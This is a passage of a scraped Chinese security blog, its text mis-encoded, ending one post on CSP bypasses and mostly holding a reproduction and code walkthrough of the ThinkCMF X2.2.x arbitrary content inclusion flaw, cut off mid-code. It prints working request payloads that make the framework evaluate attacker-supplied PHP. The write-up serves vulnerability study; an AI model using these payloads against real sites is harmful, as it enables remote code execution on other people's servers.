<p>è¿™ä¸ªCSPè§„åˆ™ä¸»è¦æ˜¯ç”¨æ¥é€‚åº”å„ç§å„æ ·çš„ç°ä»£å‰ç«¯æ¡†æ¶ï¼Œé€šè¿‡è¿™ä¸ªè§„åˆ™ï¼Œå¯ä»¥å¤§å¹…åº¦é¿å…å› ä¸ºé€‚åº”æ¡†æ¶è€Œå˜å¾—æ¾æ•£çš„CSPè§„åˆ™ã€‚</p>
<p>strict-dynamicç»“åˆgadgetç»•è¿‡CSP</p>
<p><a href="https://www.mi1k7ea.com/2019/02/21/ä¸€é“ç»•è¿‡CSPçš„XSSé¢˜ç›®/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/02/21/%E4%B8%80%E9%81%93%E7%BB%95%E8%BF%87CSP%E7%9A%84XSS%E9%A2%98%E7%9B%AE/</a></p>
<h3 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h3><p>å†™ä¸€äº›å’Œæœ¬æ–‡æ— å…³çš„è¯é¢˜ï¼Œ19å¹´ï¼Œç»ˆäºé‡åˆ°äº†è¿™ä¹ˆå¯çˆ±çš„å¥¹äº†233ï¼Œè™½ç„¶ç›¸è·å¾ˆè¿œå§ï¼Œä½†æˆ‘è§‰å¾—åº”è¯¥è¿˜æ˜¯æœ‰æœºä¼šçš„ï¼Œåœ¨2019å¹´çš„è¿™ä¸ªå¹´æœ«ï¼Œæˆ‘ä¸€å®šä¼šæ›´åŠ åŠªåŠ›ï¼Œå»å˜å¾—ä¼˜ç§€ä¸€äº›ï¼Œå¸Œæœ›æœ€ç»ˆå¯ä»¥å’Œå®åœ¨ä¸€èµ·å§ï¼Œå®çœŸçš„å¥½å¯çˆ±å•Šï¼</p>
<h3 id="ååè®°"><a href="#ååè®°" class="headerlink" title="ååè®°"></a>ååè®°</h3><p>PSï¼šï¼ˆ11.17 æ›´æ–°ï¼‰æˆ‘è«å¾—æ„Ÿæƒ… ğŸ™‚</p>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a href="https://lorexxar.cn/2016/08/08/ccsp/#Bypass-CSP" target="_blank" rel="noopener">https://lorexxar.cn/2016/08/08/ccsp/#Bypass-CSP</a></p>
<p><a href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/" target="_blank" rel="noopener">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</a></p>
<p><a href="https://hurricane618.me/2018/06/30/csp-bypass-summary/#åˆ©ç”¨DOM-XSS" target="_blank" rel="noopener">https://hurricane618.me/2018/06/30/csp-bypass-summary/#%E5%88%A9%E7%94%A8DOM-XSS</a></p>
<p><a href="https://wulidecade.cn/2018/09/24/CSP-And-CSP-Bypass/" target="_blank" rel="noopener">https://wulidecade.cn/2018/09/24/CSP-And-CSP-Bypass/</a></p>
<p><a href="https://xz.aliyun.com/t/318#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/318#toc-5</a></p>
<p><a href="https://evoa.me/index.php/archives/53/#toc-CSSé€‰æ‹©å™¨è·å–å†…å®¹" target="_blank" rel="noopener">https://evoa.me/index.php/archives/53/#toc-CSS%E9%80%89%E6%8B%A9%E5%99%A8%E8%8E%B7%E5%8F%96%E5%86%85%E5%AE%B9</a></p>
<p>[<a href="https://meizjm3i.github.io/2018/05/12/Use%20Wave%20File%20Bypass%20CSP/]" target="_blank" rel="noopener">https://meizjm3i.github.io/2018/05/12/Use%20Wave%20File%20Bypass%20CSP/]</a>(<a href="https://meizjm3i.github.io/2018/05/12/Use" target="_blank" rel="noopener">https://meizjm3i.github.io/2018/05/12/Use</a> Wave File Bypass CSP/)</p>
<p><a href="https://www.mi1k7ea.com/2019/02/21/ä¸€é“ç»•è¿‡CSPçš„XSSé¢˜ç›®/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/02/21/%E4%B8%80%E9%81%93%E7%BB%95%E8%BF%87CSP%E7%9A%84XSS%E9%A2%98%E7%9B%AE/</a></p>
<p><a href="https://lorexxar.cn/2017/02/16/cdn-bypass-csp/#é€šè¿‡ç›®å½•ç»•è¿‡ï¼Œå¼•å…¥ä¸€ä¸ªAngularJS" target="_blank" rel="noopener">https://lorexxar.cn/2017/02/16/cdn-bypass-csp/#%E9%80%9A%E8%BF%87%E7%9B%AE%E5%BD%95%E7%BB%95%E8%BF%87%EF%BC%8C%E5%BC%95%E5%85%A5%E4%B8%80%E4%B8%AAAngularJS</a></p>
<p><a href="https://www.freebuf.com/articles/web/121778.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/121778.html</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/31/CSP-CSP-Bypass/" data-id="ckabsu37v000kkkvr0ppjgvzc" class="article-share-link" data-share="baidu" data-title="CSP &amp; CSP-Bypass">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/31/CSP-CSP-Bypass/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Webå®‰å…¨</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-ThinkCMFä»»æ„å†…å®¹åŒ…å«æ¼æ´å¤ç°åˆ†æ" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/27/ThinkCMF%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" class="article-date">
  <time datetime="2019-10-27T08:44:50.000Z" itemprop="datePublished">2019-10-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/27/ThinkCMF%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">ThinkCMFä»»æ„å†…å®¹åŒ…å«æ¼æ´å¤ç°åˆ†æ</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="ThinkCMFç®€ä»‹"><a href="#ThinkCMFç®€ä»‹" class="headerlink" title="ThinkCMFç®€ä»‹"></a>ThinkCMFç®€ä»‹</h3><p>ThinkCMFæ˜¯ä¸€æ¬¾åŸºäºPHP+MYSQLå¼€å‘çš„ä¸­æ–‡å†…å®¹ç®¡ç†æ¡†æ¶ï¼Œåº•å±‚é‡‡ç”¨ThinkPHP3.2.3æ„å»ºã€‚<br>ThinkCMFæå‡ºçµæ´»çš„åº”ç”¨æœºåˆ¶ï¼Œæ¡†æ¶è‡ªèº«æä¾›åŸºç¡€çš„ç®¡ç†åŠŸèƒ½ï¼Œè€Œå¼€å‘è€…å¯ä»¥æ ¹æ®è‡ªèº«çš„éœ€æ±‚ä»¥åº”ç”¨çš„å½¢å¼è¿›è¡Œæ‰©å±•ã€‚</p>
<h3 id="æ¼æ´å½±å“ç‰ˆæœ¬"><a href="#æ¼æ´å½±å“ç‰ˆæœ¬" class="headerlink" title="æ¼æ´å½±å“ç‰ˆæœ¬"></a>æ¼æ´å½±å“ç‰ˆæœ¬</h3><p>ThinkCMF X1.6.0</p>
<p>ThinkCMF X2.1.0</p>
<p>ThinkCMF X2.2.0</p>
<p>ThinkCMF X2.2.1</p>
<p>ThinkCMF X2.2.2</p>
<p>ThinkCMF X2.2.3</p>
<p>æœ¬æ¬¡æ¼æ´åˆ†ææ‰€ç”¨çš„ThinkCMFç‰ˆæœ¬ä¸ºThinkCMF X2.2.2</p>
<h3 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h3><h4 id="Payload1"><a href="#Payload1" class="headerlink" title="Payload1"></a>Payload1</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=display&amp;templateFile=README.md</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ç›´æ¥ç”¨displayæ‰§è¡Œè‡ªå®šä¹‰Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;display&amp;templateFile&#x3D;README.md&amp;content&#x3D;&lt;?php phpinfo();die();</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/26/K0wlZT.png" alt="K0wlZT.png"></p>
<h4 id="Payload2"><a href="#Payload2" class="headerlink" title="Payload2"></a>Payload2</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=fetch&amp;content=<span class="meta">&lt;?php</span> phpinfo();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/26/K0w6Wd.png" alt="K0w6Wd.png"></p>
<h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><h4 id="Payload1åˆ†æ"><a href="#Payload1åˆ†æ" class="headerlink" title="Payload1åˆ†æ"></a>Payload1åˆ†æ</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=display&amp;templateFile=README.md</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆäº†è§£ä¸€ä¸‹ThinkPHPçš„æ¡†æ¶è§„åˆ™ï¼Œé€šè¿‡g\m\aå‚æ•°æŒ‡å®šåˆ†ç»„\æ¨¡å—\æ–¹æ³•ï¼Œæ¯”å¦‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">HomebaseController</span> </span>&#123;</span><br><span class="line"><span class="comment">//é¦–é¡µ å°å¤æ˜¯è€çŒ«é™¤å¤–æœ€å¸…çš„ç”·äººäº†</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;display(<span class="string">":index"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($what)</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $what;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://s2.ax1x.com/2019/10/26/K0fNNR.png" alt="K0fNNR.png"></p>
<p>Indexæ§åˆ¶å™¨</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">HomebaseController</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line"><span class="comment">//é¦–é¡µ å°å¤æ˜¯è€çŒ«é™¤å¤–æœ€å¸…çš„ç”·äººäº†</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;display(<span class="string">":index"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–é¡µç”¨çš„æ˜¯Indexæ§åˆ¶å™¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡aæ–¹æ³•è°ƒç”¨çˆ¶ç±»ä¸­å±æ€§ä¸ºpublicçš„å‡½æ•°ï¼Œä¸€å…±æœ‰ä¸‰ä¸ªæ»¡è¶³è¿™æ ·æ¡ä»¶çš„å‡½æ•°.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> display()&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> fetch()&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> parseTemplaye()&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦èƒ½åˆ©ç”¨çš„æ˜¯displayæ–¹æ³•å’Œfetchæ–¹æ³•ã€‚</p>
<p><strong>è·Ÿè¿›çˆ¶ç±»HomebaseControllerä¸­çš„displayæ–¹æ³•</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile = <span class="string">''</span>, $charset = <span class="string">''</span>, $contentType = <span class="string">''</span>, $content = <span class="string">''</span>, $prefix = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">parent</span>::display(<span class="keyword">$this</span>-&gt;parseTemplate($templateFile), $charset, $contentType,$content,$prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶$templateFileä¸ºreadme.md</p>
<p><strong>è·Ÿè¿›parseTemplate</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseTemplate</span><span class="params">($template=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(is_file($template)) &#123;   </span><br><span class="line"><span class="keyword">return</span> $template;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡parseTemplateæœ€ç»ˆè¿”å›readme.md</p>
<p>è·Ÿè¿›Controller.class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile=<span class="string">''</span>,$charset=<span class="string">''</span>,$contentType=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;display($templateFile,$charset,$contentType,$content,$prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›Think\View-&gt;display</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile=<span class="string">''</span>,$charset=<span class="string">''</span>,$contentType=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    G(<span class="string">'viewStartTime'</span>);</span><br><span class="line">    <span class="comment">// è§†å›¾å¼€å§‹æ ‡ç­¾</span></span><br><span class="line">    Hook::listen(<span class="string">'view_begin'</span>,$templateFile);</span><br><span class="line">    <span class="comment">// è§£æå¹¶è·å–æ¨¡æ¿å†…å®¹</span></span><br><span class="line">    $content = <span class="keyword">$this</span>-&gt;fetch($templateFile,$content,$prefix);</span><br><span class="line">    <span class="comment">// è¾“å‡ºæ¨¡æ¿å†…å®¹</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;render($content,$charset,$contentType);</span><br><span class="line">    <span class="comment">// è§†å›¾ç»“æŸæ ‡ç­¾</span></span><br><span class="line">    Hook::listen(<span class="string">'view_end'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡fetchæ‹¿åˆ°$contentå†…å®¹ï¼Œæœ€ç»ˆrenderæ¸²æŸ“è¾“å‡ºã€‚</p>
<h4 id="Payload2åˆ†æ"><a href="#Payload2åˆ†æ" class="headerlink" title="Payload2åˆ†æ"></a>Payload2åˆ†æ</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=fetch&amp;content=<span class="meta">&lt;?php</span> phpinfo();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ¼æ´çš„ä¸»è¦é—®é¢˜å°±æ˜¯åœ¨äºfetchè¿™ä¸ªç‚¹ï¼Œdisplayå‡½æ•°åœ¨åæ¥è°ƒç”¨çš„ä¹Ÿæ˜¯fetch</p>
<p>è¿™ä¸ªpayloadåˆ†æçš„å…·ä½“äº†ä¸€äº›ï¼Œä¹Ÿç®—æ˜¯è¡¥è¶³displayçš„åœ¨fetchä¸­çš„è¯¦ç»†å†…å®¹å§ï¼Œçœ‹ç½‘ä¸Šçš„åˆ†æåŸºæœ¬æ¯”è¾ƒç²—ç•¥å§ï¼Œè‡ªå·±è¯•ç€æ·±å…¥çš„åˆ†æäº†ä¸€ä¸‹ã€‚æœ€å¼€å§‹è¢«ç¼“å­˜å‘äº†â€¦è¿è¡Œè¿‡ä¸€éâ€¦ç¬¬äºŒæ¬¡ç›´æ¥å®šä½åˆ°ç¼“å­˜é‚£å»äº†â€¦</p>
<h5 id="ç¬¬ä¸€æ¬¡è¿è¡Œçš„åˆ†æ"><a href="#ç¬¬ä¸€æ¬¡è¿è¡Œçš„åˆ†æ" class="headerlink" title="ç¬¬ä¸€æ¬¡è¿è¡Œçš„åˆ†æ"></a>ç¬¬ä¸€æ¬¡è¿è¡Œçš„åˆ†æ</h5><p><a href="https://www.anquanke.com/post/id/189712" target="_blank" rel="noopener">https://www.anquanke.com/post/id/189712</a></p>
<p>ç¬¬ä¸€æ¬¡æ˜¯æ²¡æœ‰ç¼“å­˜æ–‡ä»¶çš„ï¼Œå…¶å®å’Œæˆ‘ç¬¬äºŒæ¬¡åˆ†æçš„ä¹Ÿå·®ä¸å¤šï¼Œåªä¸è¿‡å› ä¸ºæˆ‘æ˜¯ç¬¬äºŒæ¬¡æ‰€ä»¥è¿›å…¥çš„æ˜¯if,æ²¡æœ‰è¿›å…¥elseä¸­çš„fetchå‡½æ•°ã€‚</p>
<h5 id="ç¬¬äºŒæ¬¡è¿è¡Œçš„åˆ†æ"><a href="#ç¬¬äºŒæ¬¡è¿è¡Œçš„åˆ†æ" class="headerlink" title="ç¬¬äºŒæ¬¡è¿è¡Œçš„åˆ†æ"></a>ç¬¬äºŒæ¬¡è¿è¡Œçš„åˆ†æ</h5><p><strong>HomebaseController.class.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span></span>&#123;</span><br><span class="line">    $templateFile = <span class="keyword">empty</span>($content)?<span class="keyword">$this</span>-&gt;parseTemplate($templateFile):<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::fetch($templateFile,$content,$prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>è·Ÿè¿›Controller.class.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;view-&gt;fetch($templateFile,$content,$prefix);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><strong>è·Ÿè¿›View.class.phpä¸­fetchæ–¹æ³•ä¸­listen</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'php'</span> == strtolower(C(<span class="string">'TMPL_ENGINE_TYPE'</span>))) &#123; <span class="comment">// ä½¿ç”¨PHPåŸç”Ÿæ¨¡æ¿</span></span><br><span class="line">        $_content   =   $content;</span><br><span class="line">        <span class="comment">// æ¨¡æ¿é˜µåˆ—å˜é‡åˆ†è§£æˆä¸ºç‹¬ç«‹å˜é‡</span></span><br><span class="line">        extract(<span class="keyword">$this</span>-&gt;tVar, EXTR_OVERWRITE);</span><br><span class="line">        <span class="comment">// ç›´æ¥è½½å…¥PHPæ¨¡æ¿</span></span><br><span class="line">        <span class="keyword">empty</span>($_content)?<span class="keyword">include</span> $templateFile:<span class="keyword">eval</span>(<span class="string">'?&gt;'</span>.$_content);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// è§†å›¾è§£ææ ‡ç­¾</span></span><br><span class="line">        $params = <span class="keyword">array</span>(<span class="string">'var'</span>=&gt;<span class="keyword">$this</span>-&gt;tVar,<span class="string">'file'</span>=&gt;$templateFile,<span class="string">'content'</span>=&gt;$content,<span class="string">'prefix'</span>=&gt;$prefix);</span><br><span class="line">        Hook::listen(<span class="string">'view_parse'</span>,$params);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è·å–å¹¶æ¸…ç©ºç¼“å­˜</span></span><br><span class="line">    $content = ob_get_clean();</span><br><span class="line">    <span class="comment">// å†…å®¹è¿‡æ»¤æ ‡ç­¾</span></span><br><span class="line">    Hook::listen(<span class="string">'view_filter'</span>,$content);</span><br><span class="line">    <span class="comment">// è¾“å‡ºæ¨¡æ¿æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>è·Ÿè¿›Hook.class.phpä¸­exec</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">listen</span><span class="params">($tag, &amp;$params=NULL)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">self</span>::$tags[$tag])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(APP_DEBUG) &#123;</span><br><span class="line">            G($tag.<span class="string">'Start'</span>);</span><br><span class="line">            trace(<span class="string">'[ '</span>.$tag.<span class="string">' ] --START--'</span>,<span class="string">''</span>,<span class="string">'INFO'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">self</span>::$tags[$tag] <span class="keyword">as</span> $name) &#123;</span><br><span class="line">            APP_DEBUG &amp;&amp; G($name.<span class="string">'_start'</span>);</span><br><span class="line">            $result =   <span class="keyword">self</span>::exec($name, $tag,$params);</span><br><span class="line">            <span class="keyword">if</span>(APP_DEBUG)&#123;</span><br><span class="line">                G($name.<span class="string">'_end'</span>);</span><br><span class="line">                trace(<span class="string">'Run '</span>.$name.<span class="string">' [ RunTime:'</span>.G($name.<span class="string">'_start'</span>,$name.<span class="string">'_end'</span>,<span class="number">6</span>).<span class="string">'s ]'</span>,<span class="string">''</span>,<span class="string">'INFO'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">false</span> === $result) &#123;</span><br><span class="line">....</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Execå¦‚ä¸‹</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">($name, $tag,&amp;$params=NULL)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'Behavior'</span> == substr($name,<span class="number">-8</span>) )&#123;</span><br><span class="line">        <span class="comment">// è¡Œä¸ºæ‰©å±•å¿…é¡»ç”¨runå…¥å£æ–¹æ³•</span></span><br><span class="line">        $class = $name;</span><br><span class="line">        $tag    =   <span class="string">'run'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $class   =  <span class="string">"plugins\\&#123;$name&#125;\\&#123;$name&#125;Plugin"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(class_exists($class))&#123; <span class="comment">//ThinkCMF NOTE æ’ä»¶æˆ–è€…è¡Œä¸ºå­˜åœ¨æ—¶æ‰æ‰§è¡Œ</span></span><br><span class="line">        $addon   = <span class="keyword">new</span> $class();</span><br><span class="line">        <span class="keyword">return</span> $addon-&gt;$tag($params);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›runæ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">(&amp;$_data)</span></span>&#123;</span><br><span class="line">    $engine             =   strtolower(C(<span class="string">'TMPL_ENGINE_TYPE'</span>));</span><br><span class="line">    $_content           =   <span class="keyword">empty</span>($_data[<span class="string">'content'</span>])?$_data[<span class="string">'file'</span>]:$_data[<span class="string">'content'</span>];</span><br><span class="line">    $_data[<span class="string">'prefix'</span>]    =   !<span class="keyword">empty</span>($_data[<span class="string">'prefix'</span>])?$_data[<span class="string">'prefix'</span>]:C(<span class="string">'TMPL_CACHE_PREFIX'</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'think'</span>==$engine)&#123; <span class="comment">// é‡‡ç”¨Thinkæ¨¡æ¿å¼•æ“</span></span><br><span class="line">        <span class="keyword">if</span>((!<span class="keyword">empty</span>($_data[<span class="string">'content'</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;checkContentCache($_data[<span class="string">'content'</span>],$_data[<span class="string">'prefix'</span>])) </span><br><span class="line">            ||  <span class="keyword">$this</span>-&gt;checkCache($_data[<span class="string">'file'</span>],$_data[<span class="string">'prefix'</span>])) &#123; <span class="comment">// ç¼“å­˜æœ‰æ•ˆ</span></span><br><span class="line">            <span class="comment">//è½½å…¥æ¨¡ç‰ˆç¼“å­˜æ–‡ä»¶</span></span><br><span class="line">            Storage::load(C(<span class="string">'CACHE_PATH'</span>).$_data[<span 